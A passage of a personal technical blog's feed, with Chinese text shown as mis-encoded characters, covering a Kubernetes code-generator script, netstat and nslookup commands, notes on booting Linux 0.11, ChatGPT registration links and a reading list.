<span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;deepcopy&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating deepcopy funcs&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/deepcopy-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      -O zz_generated.deepcopy \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;client&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating clientset for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/client-gen&quot;</span> \<br>      --clientset-name <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --input-base <span class="hljs-string">&quot;&quot;</span> \<br>      --input <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;lister&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating listers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/lister-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;informer&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating informers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/informer-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --versioned-clientset-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --listers-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoint:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [Endpointes:Endpointes] \</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes:ProductInstanceVpcInfoes] \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes:ProductInstanceVpcInfoes \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes \    # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes] \  # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfo,ProductInstanceVpcInfoes] \  # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfo,ProductInstanceVpcInfoes&quot;] \  # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions &quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot; \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;, &quot;Endpoints:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;],[&quot;Endpoints:Endpointes&quot;] \</span><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/kubernetes/code-generator">code-generator github</a><br><a href="https://juejin.cn/post/7096484178128011277"># code-generatorç®€å•ä»‹ç»</a><br>[# [k8sè‡ªå®šä¹‰controllerè®¾è®¡ä¸å®ç°] (æœ‰controllerçš„ä¸šåŠ¡å¤„ç†ç¤ºä¾‹ï¼Œè¿˜æœ‰æ³¨é‡Š)<br><a href="https://www.51cto.com/article/692169.html">Kubernetesä¸­è‡ªå®šä¹‰Controller</a> (æœ‰controllerçš„ä¸šåŠ¡å¤„ç†ç¤ºä¾‹ï¼Œè¿˜æœ‰æ³¨é‡Š)</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€chatGPTã€‘æ³¨å†Œ</title>
    <link href="/2023/03/01/tools/%E3%80%90chatGPT%E3%80%91%E6%B3%A8%E5%86%8C/"/>
    <url>/2023/03/01/tools/%E3%80%90chatGPT%E3%80%91%E6%B3%A8%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒï¼š</p><p><a href="https://foofish.net/how-to-registe-chatGPT.html"># ChatGPTä¿å§†çº§æ³¨å†Œæ•™ç¨‹</a><br><a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘netstatå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2023/02/28/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91netstat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/02/28/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91netstat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">netstat -ap <span class="hljs-comment">--unix </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘nslookupå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2023/02/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nslookup%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/02/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nslookup%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥è¯¢Aè®°å½•</span><br>nslookup çš„æŸ¥è¯¢åœ¨ä¸æŒ‡å®šå‚æ•°çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤æŸ¥è¯¢çš„ç±»å‹ä¸ºA<br>nslookup baidu.com = nslookup -qt=A baidu.com <br><br><br><span class="hljs-comment"># å¦‚ä½•ä½¿ç”¨æŒ‡å®šDNSæœåŠ¡å™¨æŸ¥è¯¢?</span><br>è¯­æ³•ä¸º nslookup -qt=ç±»å‹ ç›®æ ‡åŸŸå æŒ‡å®šçš„DNSæœåŠ¡å™¨IPæˆ–åŸŸå<br>ä¾‹å­ï¼šnslookup -qt=A tool.chinaz.com 8.8.8.8<br>= nslookup tool.chinaz.com 8.8.8.8<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux0.11 æºç è¶£è¯»</title>
    <link href="/2023/02/16/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux0.11%20%E6%BA%90%E7%A0%81%E8%B6%A3%E8%AF%BB/"/>
    <url>/2023/02/16/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux0.11%20%E6%BA%90%E7%A0%81%E8%B6%A3%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>æºç ä¸‹è½½åœ°å€ï¼š<a href="http://www.oldlinux.org/Linux.old/">http://www.oldlinux.org/Linux.old/</a></p><h2 id="Part-1ï¼šè¿›å…¥å†…æ ¸å‰çš„è‹¦åŠ›æ´»"><a href="#Part-1ï¼šè¿›å…¥å†…æ ¸å‰çš„è‹¦åŠ›æ´»" class="headerlink" title="Part 1ï¼šè¿›å…¥å†…æ ¸å‰çš„è‹¦åŠ›æ´»"></a>Part 1ï¼šè¿›å…¥å†…æ ¸å‰çš„è‹¦åŠ›æ´»</h2><h3 id="01ï½œå¼€æœºåæœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#01ï½œå¼€æœºåæœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="01ï½œå¼€æœºåæœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ"></a>01ï½œå¼€æœºåæœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://www.oldlinux.org/Linux.old/kernel/0.1x/linux-0.11.tar.gz<br>tar -zxvf linux-0.11.tar.gz<br></code></pre></td></tr></table></figure><p>CPU ä¸­æœ‰ä¸ª PC å¯„å­˜å™¨  å¯„å­˜å™¨åœ¨CPUä¸­å—ï¼Ÿ<br>å†…å­˜ï¼ˆRAMï¼‰ï¼Ÿ<br>ROM(BIOS)</p><p>Intel æ‰‹å†Œè§„å®šï¼Œå¼€æœºå PC å¯„å­˜å™¨è¦åˆå§‹åŒ–ä¸º 0xFFFF0ï¼Œä¹Ÿå°±æ˜¯ä»è¿™ä¸ªå†…å­˜åœ°å€å¼€å§‹ï¼Œæ‰§è¡Œ CPU çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>ds æ˜¯é»˜è®¤åŠ ä¸Šçš„ï¼Œè¡¨ç¤ºåœ¨ ds è¿™ä¸ªæ®µåŸºå€å¤„ï¼Œå¾€åå†åç§» 0x0001 å•ä½ï¼Œå°†è¿™ä¸ªä½ç½®çš„å†…å­˜æ•°æ®å¤åˆ¶åˆ° ax å¯„å­˜å™¨ä¸­ã€‚</p><p>ds è¿™ä¸ªæ•°æ®æ®µå¯„å­˜å™¨çš„ä½œç”¨å°±æ˜¯è¿™æ ·ï¼Œæ–¹ä¾¿äº†æè¿°ä¸€ä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå¯ä»¥çœç•¥ä¸€ä¸ªåŸºå€<br>ç¬¬ä¸€æ­¥ï¼ŒBIOS å°†æ“ä½œç³»ç»Ÿä»£ç åŠ è½½åˆ°å†…å­˜ 0x7c00ï¼›ç¬¬äºŒæ­¥ï¼Œé€šè¿‡ mov æŒ‡ä»¤å°†é»˜è®¤çš„æ•°æ®æ®µå¯„å­˜å™¨ ds çš„å€¼æ”¹ä¸º 0x07c0ï¼Œæ–¹ä¾¿ä»¥åçš„åŸºå€å¯»å€æ–¹å¼ã€‚</p><p>è®¿é—®æŒ‡ä»¤æ—¶ cs å°±æ˜¯åŸºå€ï¼Œè®¿é—®æ ˆæ—¶ ss æ˜¯åŸºå€ã€‚</p><p>å†…å­˜åœ°å€ä¸ºä½•æ˜¯0x7c00ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="http://www.ruanyifeng.com/blog/2015/09/0x7c00.html">http://www.ruanyifeng.com/blog/2015/09/0x7c00.html</a><br>0x7C00è¿™ä¸ªåœ°å€æ¥è‡ªIntelçš„ç¬¬ä¸€ä»£ä¸ªäººç”µè„‘èŠ¯ç‰‡8088ï¼Œä»¥åçš„CPUä¸ºäº†ä¿æŒå…¼å®¹ï¼Œä¸€ç›´ä½¿ç”¨è¿™ä¸ªåœ°å€ã€‚ å½“æ—¶ï¼Œæ­é…çš„æ“ä½œç³»ç»Ÿæ˜¯86-DOSã€‚è¿™ä¸ªæ“ä½œç³»ç»Ÿéœ€è¦çš„å†…å­˜æœ€å°‘æ˜¯32KBã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå†…å­˜åœ°å€ä»0x0000å¼€å§‹ç¼–å·ï¼Œ32KBçš„å†…å­˜å°±æ˜¯0x0000ï½0x7FFF ç”±äºä¸€ä¸ªæ‰‡åŒºæ˜¯512å­—èŠ‚ï¼Œä¸»å¼•å¯¼è®°å½•æœ¬èº«ä¹Ÿä¼šäº§ç”Ÿæ•°æ®ï¼Œéœ€è¦å¦å¤–ç•™å‡º512å­—èŠ‚ä¿å­˜ã€‚æ‰€ä»¥ï¼Œå®ƒçš„é¢„ç•™ä½ç½®å°±å˜æˆäº†ï¼š 0x7FFF - 512 - 512 + 1 &#x3D; 0x7C00 è‡³äºä¸ºä»€ä¹ˆæŠŠå¼•å¯¼ç¨‹åºæ”¾åœ¨æœ€åçš„ä½ç½®ï¼Ÿå› ä¸ºæ“ä½œç³»ç»Ÿå¯åŠ¨åï¼Œä¸»å¼•å¯¼è®°å½•å°±æ²¡æœ‰ç”¨å¤„äº†ï¼Œæ­¤åå®ƒæ‰€åœ¨çš„å†…å­˜åœ°å€å¯ä»¥è¢«æ“ä½œç³»ç»Ÿé‡æ–°åˆ©ç”¨ï¼Œæ‰€ä»¥æ”¾åœ¨æœ€åäº†ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€booksã€‘é˜…è¯»ä¹¦ç±</title>
    <link href="/2023/02/16/books/%E3%80%90books%E3%80%91%E9%98%85%E8%AF%BB%E4%B9%A6%E7%B1%8D/"/>
    <url>/2023/02/16/books/%E3%80%90books%E3%80%91%E9%98%85%E8%AF%BB%E4%B9%A6%E7%B1%8D/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th align="left">æ€»é˜…è¯»</th><th align="left">å¹´åº¦é˜…è¯»</th><th align="left">ä¹¦å</th><th align="left">ä½œè€…</th><th align="left">å¼€å§‹æ—¶é—´</th><th align="left">ç»“æŸæ—¶é—´</th><th align="left">å†æ—¶(å¤©)</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">1</td><td align="left">ã€Šå‡­ä»€ä¹ˆè®©äººå–œæ¬¢ä½ ã€‹</td><td align="left"></td><td align="left">2019.4.18</td><td align="left">2019.5.5</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">1</td><td align="left">ã€Šå°å¼ºå‡èŒè®°ã€‹</td><td align="left"></td><td align="left">2020.6.1</td><td align="left">2020.6.5</td><td align="left">5</td></tr><tr><td align="left">3</td><td align="left">2</td><td align="left">ã€Šå·å½±å­çš„äººã€‹</td><td align="left"></td><td align="left">2020.6.6</td><td align="left">2020.6.15</td><td align="left">10</td></tr><tr><td align="left">4</td><td align="left">3</td><td align="left">ã€Šæ™¨é—´æ—¥è®°çš„å¥‡è¿¹ã€‹</td><td align="left"></td><td align="left">2020.6.16</td><td align="left">2020.6.21</td><td align="left">6</td></tr><tr><td align="left">5</td><td align="left">4</td><td align="left">ã€Šè‡ªæ§åŠ›ã€‹</td><td align="left"></td><td align="left">2020.11.7</td><td align="left">2020.12.31</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">ã€Šè”¡åº·æ°¸çš„è¯´è¯ä¹‹é“ã€‹</td><td align="left"></td><td align="left">2021.1.4</td><td align="left">2021.1.8</td><td align="left">5</td></tr><tr><td align="left">7</td><td align="left">2</td><td align="left">ã€Šè”¡åº·æ°¸çš„è¯´è¯ä¹‹é“2ã€‹</td><td align="left"></td><td align="left">2021.1.12</td><td align="left">2021.1.20</td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">3</td><td align="left">ã€Šç”Ÿæ´»éœ€è¦ä»ªå¼æ„Ÿã€‹</td><td align="left"></td><td align="left">2021.3.8</td><td align="left">2021.3.24</td><td align="left"></td></tr><tr><td align="left">9</td><td align="left">4</td><td align="left">ã€Šå…”å­ä»€ä¹ˆéƒ½çŸ¥é“ã€‹</td><td align="left"></td><td align="left">2021.3.16</td><td align="left">2021.4.20</td><td align="left"></td></tr><tr><td align="left">10</td><td align="left">5</td><td align="left">ã€Šçº³å…°å®¹è‹¥è¯ä¼ ã€‹</td><td align="left"></td><td align="left">2021.5.24</td><td align="left">2021.7.2</td><td align="left"></td></tr><tr><td align="left">11</td><td align="left">6</td><td align="left">ã€Šä¸€è¾ˆå­å¾ˆé•¿è¦å’Œæœ‰è¶£çš„äººåœ¨ä¸€èµ·ã€‹</td><td align="left"></td><td align="left">2021.5.26</td><td align="left">2021.7.16</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">12</td><td align="left">1</td><td align="left">ã€Šæœˆäº®ä¸å…­ä¾¿å£«ã€‹</td><td align="left"></td><td align="left">2022.1.13</td><td align="left">2022.5.6</td><td align="left"></td></tr><tr><td align="left">13</td><td align="left">2</td><td align="left">ã€Šçš®å›Šã€‹</td><td align="left"></td><td align="left">2022.4.23</td><td align="left">2022.4.30</td><td align="left"></td></tr><tr><td align="left">14</td><td align="left">3</td><td align="left">ã€Šè¿½é£ç­çš„äººã€‹</td><td align="left"></td><td align="left">2022.5.7</td><td align="left">2022.7.19</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">15</td><td align="left">1</td><td align="left">ã€Šæ’’å“ˆæ‹‰çš„æ•…äº‹ã€‹</td><td align="left"></td><td align="left">2022.12.31</td><td align="left">2023.02.02</td><td align="left"></td></tr><tr><td align="left">16</td><td align="left">2</td><td align="left">ã€Šè°åŠ¨äº†æˆ‘çš„å¥¶é…ªã€‹</td><td align="left"></td><td align="left">2023.02.16</td><td align="left">2023.02.16</td><td align="left"></td></tr><tr><td align="left">17</td><td align="left">3</td><td align="left">ã€Šä½ ä»Šå¤©çœŸå¥½çœ‹ã€‹</td><td align="left"></td><td align="left">2023.02.17</td><td align="left">2023.02.17</td><td align="left"></td></tr><tr><td align="left">18</td><td align="left">4</td><td align="left">ã€Šå¾·ç±³å®‰-å½·å¾¨å°‘å¹´æ—¶ã€‹</td><td align="left"></td><td align="left">2023.06.10</td><td align="left">2023.06.11</td><td align="left"></td></tr><tr><td align="left">19</td><td align="left">5</td><td align="left">ã€Šæ‚‰è¾¾å¤šã€‹</td><td align="left"></td><td align="left">2023.06.22</td><td align="left">2023.06.28</td><td align="left"></td></tr><tr><td align="left">20</td><td align="left">6</td><td align="left">ã€Šçª—è¾¹çš„å°è±†è±†ã€‹</td><td align="left"></td><td align="left">2023.07.01</td><td align="left">2023.07.06</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">ã€Šåˆ«æƒ³å¤ªå¤šå•¦ã€‹</td><td align="left"></td><td align="left">2022.9.12</td><td align="left">xxx</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">ã€Šç¡¬æ´¾å¥èº«100é—®ã€‹</td><td align="left"></td><td align="left">2023.02.07</td><td align="left">xxx</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹</td><td align="left"></td><td align="left">2023.4.23</td><td align="left">xxx</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><h1 id="2023é˜…è¯»ä¹¦ç±"><a href="#2023é˜…è¯»ä¹¦ç±" class="headerlink" title="2023é˜…è¯»ä¹¦ç±"></a>2023é˜…è¯»ä¹¦ç±</h1><h2 id="ã€Šæ’’å“ˆæ‹‰çš„æ•…äº‹ã€‹"><a href="#ã€Šæ’’å“ˆæ‹‰çš„æ•…äº‹ã€‹" class="headerlink" title="ã€Šæ’’å“ˆæ‹‰çš„æ•…äº‹ã€‹"></a>ã€Šæ’’å“ˆæ‹‰çš„æ•…äº‹ã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼šå¾®ä¿¡è¯»ä¹¦ â€“&gt; é˜…è¯»å™¨<br>é˜…è¯»æ—¶é—´ï¼š2022.12.31-2023.02.02<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230216135833.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230216140233.png" alt="image.png"></p><h2 id="ã€Šè°åŠ¨äº†æˆ‘çš„å¥¶é…ªã€‹"><a href="#ã€Šè°åŠ¨äº†æˆ‘çš„å¥¶é…ªã€‹" class="headerlink" title="ã€Šè°åŠ¨äº†æˆ‘çš„å¥¶é…ªã€‹"></a>ã€Šè°åŠ¨äº†æˆ‘çš„å¥¶é…ªã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼šå¾®ä¿¡è¯»ä¹¦<br>é˜…è¯»æ—¶é—´ï¼š 2023.02.16-2023.02.16</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230216140823.png" alt="image.png"></p><h2 id="ã€Šä½ ä»Šå¤©çœŸå¥½çœ‹ã€‹"><a href="#ã€Šä½ ä»Šå¤©çœŸå¥½çœ‹ã€‹" class="headerlink" title="ã€Šä½ ä»Šå¤©çœŸå¥½çœ‹ã€‹"></a>ã€Šä½ ä»Šå¤©çœŸå¥½çœ‹ã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼šå¾®ä¿¡è¯»ä¹¦<br>é˜…è¯»æ—¶é—´ï¼š 2023.02.17</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/819b7fef85a38af88123e0ed52c3c56.jpg" alt="819b7fef85a38af88123e0ed52c3c56.jpg"></p><h2 id="ã€Šå¾·ç±³å®‰-å½·å¾¨å°‘å¹´æ—¶ã€‹"><a href="#ã€Šå¾·ç±³å®‰-å½·å¾¨å°‘å¹´æ—¶ã€‹" class="headerlink" title="ã€Šå¾·ç±³å®‰-å½·å¾¨å°‘å¹´æ—¶ã€‹"></a>ã€Šå¾·ç±³å®‰-å½·å¾¨å°‘å¹´æ—¶ã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼š çº¸è´¨ä¹¦<br>é˜…è¯»æ—¶é—´ï¼š2023.06.10-2023.06.11</p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/4d914420e783e7650e3ea8b783f87c4.jpg" width="50%" height="50%"><h2 id="ã€Šæ‚‰è¾¾å¤šã€‹"><a href="#ã€Šæ‚‰è¾¾å¤šã€‹" class="headerlink" title="ã€Šæ‚‰è¾¾å¤šã€‹"></a>ã€Šæ‚‰è¾¾å¤šã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼š çº¸è´¨ä¹¦<br>é˜…è¯»æ—¶é—´ï¼š2023.06.22-2023.06.28</p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/094db4f6d50607928e640ceb7a6b96b.jpg" width="50%" height="50%"><h2 id="ã€Šçª—è¾¹çš„å°è±†è±†ã€‹"><a href="#ã€Šçª—è¾¹çš„å°è±†è±†ã€‹" class="headerlink" title="ã€Šçª—è¾¹çš„å°è±†è±†ã€‹"></a>ã€Šçª—è¾¹çš„å°è±†è±†ã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼š å¾®ä¿¡è¯»ä¹¦<br>é˜…è¯»æ—¶é—´ï¼š2023.07.01 -&gt; 2023.07.06</p><h2 id="ã€Šç¡¬æ´¾å¥èº«100é—®ã€‹"><a href="#ã€Šç¡¬æ´¾å¥èº«100é—®ã€‹" class="headerlink" title="ã€Šç¡¬æ´¾å¥èº«100é—®ã€‹"></a>ã€Šç¡¬æ´¾å¥èº«100é—®ã€‹</h2><p>é˜…è¯»æ–¹å¼ï¼š çº¸è´¨ä¹¦<br>é˜…è¯»æ—¶é—´ï¼š 2023.02.07  â€“&gt; </p><h2 id="ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹"><a href="#ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹" class="headerlink" title="ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹"></a>ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹</h2><p>2023.4.23</p>]]></content>
    
    
    <categories>
      
      <category>books</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘å­¦ä¹ èµ„æ–™æ±‡æ€»</title>
    <link href="/2023/02/15/ebpf/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/"/>
    <url>/2023/02/15/ebpf/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/</url>
    
